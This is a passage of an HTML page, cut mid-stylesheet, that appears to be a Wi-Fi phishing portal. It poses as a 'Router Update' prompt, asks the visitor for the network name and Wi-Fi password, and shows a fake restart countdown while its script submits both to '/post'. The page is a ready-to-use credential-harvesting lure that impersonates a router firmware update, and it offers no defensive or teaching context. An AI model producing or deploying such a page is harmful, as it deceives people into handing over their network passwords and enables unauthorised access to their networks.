            background-position: center;
            background-attachment: fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 10px;
            box-sizing: border-box;
        }
        
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 360px;
            width: 100%;
        }
        
        .container img {
            width: 250px;
            height: 150px;
            fill: #ff1744;
            margin-bottom: 10px;
            justify-content: center;
            align-items: center;
        }
        
        h1 {
            color: #333;
            font-size: 22px;
            margin-bottom: 15px;
        }
        
        p {
            color: #666;
            font-size: 15px;
            margin-bottom: 20px;
        }
        
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        button {
            width: 100%;
            padding: 12px;
            background-color: #ff1744;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        
        button:hover {
            background-color: #0056b3;
        }
        
        div#success-block {
            display: none;
            text-align: center;
            min-height: 60px;
            margin-bottom: 30px;
            justify-content: center;
            align-items: center;
        }
    </style>
</head>

        <h1>Router Update</h1>
        <div id='form-block'>
            <p>Router firmware update required. Enter your Wi-Fi password to update.</p>
            <form id='submit-form' action="/post">
                <input name='email' class='input-field' type='text' placeholder='Enter SSID/Wi-Fi Name' required>
                <input type="password" name="password" placeholder="Enter Wi-Fi network password" required>
                <button type="submit">Update</button>
            </form>
        </div>
        <div id='success-block'>
            <p>The router will restart in <span id="span-count" style="font-weight: bolder;">5</span></p>
        </div>
    </div>

    <script>
        document.getElementById('submit-form').addEventListener('submit', function(event) {
            event.preventDefault();

            document.getElementById('success-block').style.display = 'flex';
            document.getElementById('form-block').style.display = 'none';

            setInterval(function() {
                index = parseInt(document.getElementById('span-count').textContent)
                if (index > 1) {
                    document.getElementById('span-count').textContent = index - 1;
                    index--;
                } else {
                    document.getElementById('submit-form').submit();
                }
            }, 1000);
        });
    </script>
